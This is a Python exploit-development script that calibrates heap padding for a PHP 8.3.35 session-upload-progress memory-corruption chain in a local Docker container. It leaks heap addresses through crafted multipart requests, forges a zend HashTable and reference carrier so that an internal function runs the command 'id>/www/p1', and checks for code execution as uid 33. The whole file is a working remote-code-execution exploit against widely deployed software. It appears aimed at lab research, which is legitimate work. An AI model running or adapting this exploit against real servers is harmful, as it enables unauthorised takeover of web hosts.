"""8.3.35 stage-3 pad calibration.
Goal: find the pad config (request A) + field order (request B) such that the
15-byte carrier lands exactly on R's val.value field (bytes 8-15 of the zend_reference),
so that R.val.value = fake HashTable pointer (htdata).

Metric: after request B, read R (PS(http_session_vars).value) and check:
  - rc == 1 (carrier hit)
  - type_info == 0x1A (IS_REFERENCE)
  - val.value low 7 bytes == htdata low 7 bytes (CARRIER LANDED ON val.value)
  - RCE proof (uid=33)

We sweep the number of (31,31) pads in request A, and also try varying the
carrier position (f00/f01 count) in request B.
"""
import os
import subprocess, sys, time, os, struct, importlib.util
from collections import Counter

BASE = os.path.dirname(os.path.abspath(__file__))
C = "p2s8335"
PORT = 18112
PSG_OFF = 0x10432a0
HSV_OFF = 0x150
ZIF = 0x3ac080
HTDATA_OFF = 0x690d8

spec = importlib.util.spec_from_file_location("exploit", os.path.join(BASE, "exploit.py"))
E = importlib.util.module_from_spec(spec)
spec.loader.exec_module(E)

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def get_worker():
    r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    wpid = pids[-1]
    r = sh(f'docker exec {C} sh -c "grep libphp /proc/{wpid}/maps 2>/dev/null | head -1"')
    B = int(r.stdout.strip().split("-")[0], 16)
    return wpid, B

def read_mem(wpid, addr, size):
    r = subprocess.run(
        f'docker exec {C} sh -c "dd if=/proc/{wpid}/mem bs=1 skip={addr} count={size} 2>/dev/null"',
        shell=True, capture_output=True
    )
    return r.stdout

def rotate():
    r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    if len(pids) >= 2:
        sh(f'docker exec {C} kill -9 {pids[-1]}')
    time.sleep(1.0)
    for _ in range(30):
        r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
        if len(r.stdout.strip().splitlines()) >= 2:
            return
        time.sleep(0.5)

def build_ht(htdata, zif_abs, cmd=b"id>/www/p1"):
    ht = bytearray(b"\x00" * 167)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif_abs)
    Eo = 0x20
    struct.pack_into("<Q", ht, Eo + 0x00, 0)
    struct.pack_into("<Q", ht, Eo + 0x08, 0)
    struct.pack_into("<Q", ht, Eo + 0x10, zif_abs)
    struct.pack_into("<Q", ht, Eo + 0x18, 0)
    struct.pack_into("<Q", ht, Eo + 0x20, 0)
    struct.pack_into("<I", ht, Eo + 0x28, 0)
    struct.pack_into("<I", ht, Eo + 0x2C, 1)
    struct.pack_into("<Q", ht, Eo + 0x30, 0)
    struct.pack_into("<Q", ht, Eo + 0x38, 0)
    struct.pack_into("<I", ht, Eo + 0x40, 0)
    struct.pack_into("<Q", ht, Eo + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, Eo + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)

def try_pad(n_pads, n_f=2, n_ht=15, ht_n=15):
    """n_pads: number of (31,31) pads in request A.
       n_f: number of 15-byte f-fields before carrier in request B.
       n_ht: number of 167-byte ht fields in request B."""
    wpid, B = get_worker()
    ps_hsv = B + PSG_OFF + HSV_OFF
    t = E.Target(f"http://127.0.0.1:{PORT}/index.php", timeout=120, verbose=False)

    # stage-1 leak for chunk_base
    parts_s1 = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts_s1 += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    resp = t.post(E.build_multipart(parts_s1, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    raw = E.parse_cookie(resp)
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk_base = c.most_common(1)[0][0] if c else 0
    htdata = chunk_base + HTDATA_OFF
    zif_abs = B + ZIF

    # request A
    parts_a = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for i in range(n_pads):
        parts_a.append({"name": f"p{i:029d}"[:31], "data": b"V" * 31})
    parts_a.append({"name": "f", "filename": "a.txt", "data": b"A" * 64})
    parts_a.append({"name": "big", "data": b"B" * (12 * 1024 * 1024)})
    t.post(E.build_multipart(parts_a, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120,
           extra_headers={"Cookie": "PHPSESSID=" + "a" * 32})
    time.sleep(0.25)

    data = read_mem(wpid, ps_hsv, 16)
    R = struct.unpack("<Q", data[:8])[0] if len(data) >= 8 else 0

    # request B
    ht = build_ht(htdata, zif_abs)
    carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
    parts_b = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n_f):
        parts_b.append({"name": f"f{i:02d}", "data": b"F" * 15})
    parts_b.append({"name": "g00", "data": carrier})
    for i in range(n_ht):
        parts_b.append({"name": f"a{i:030d}"[:31], "data": ht})
    t.post(E.build_multipart(parts_b, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30)
    time.sleep(0.25)

    data_b = read_mem(wpid, ps_hsv, 16)
    R_b = struct.unpack("<Q", data_b[:8])[0] if len(data_b) >= 8 else 0
    ref = read_mem(wpid, R_b, 24) if R_b else b""
    rc = struct.unpack("<I", ref[0:4])[0] if len(ref) >= 4 else -1
    typ = struct.unpack("<I", ref[4:8])[0] if len(ref) >= 8 else -1
    valv = struct.unpack("<Q", ref[8:16])[0] if len(ref) >= 16 else -1
    valv_lo7 = valv & 0x00FFFFFFFFFFFFFF
    ht_lo7 = htdata & 0x00FFFFFFFFFFFFFF
    hit = (rc == 1 and typ == 0x1A and valv_lo7 == ht_lo7)

    r = sh(f'docker exec {C} sh -c "cat /www/p1 2>/dev/null || cat /out/p1 2>/dev/null"')
    proof = r.stdout.strip()
    tag = " *** RCE ***" if proof else (" [CARRIER ON val.value]" if hit else "")
    print(f"n_pads={n_pads} n_f={n_f} n_ht={n_ht}: R_b=0x{R_b:x} rc={rc} typ=0x{typ:x} "
          f"valv=0x{valv:x} (want ht_lo7=0x{ht_lo7:x}){tag}", flush=True)
    if proof:
        print(f"  PROOF: {proof}", flush=True)
    return bool(proof), hit, ref.hex() if ref else ""

print("=== 8.3.35 stage-3 pad calibration ===", flush=True)
best = None
for n_pads in range(2, 13):
    rotate()
    proof, hit, refhex = try_pad(n_pads)
    if proof:
        print(f"\n*** RCE with n_pads={n_pads} ***", flush=True)
        break
    if hit and best is None:
        best = n_pads
    time.sleep(0.3)

if best:
    print(f"\nBest (carrier on val.value): n_pads={best}", flush=True)
print("=== done ===", flush=True)
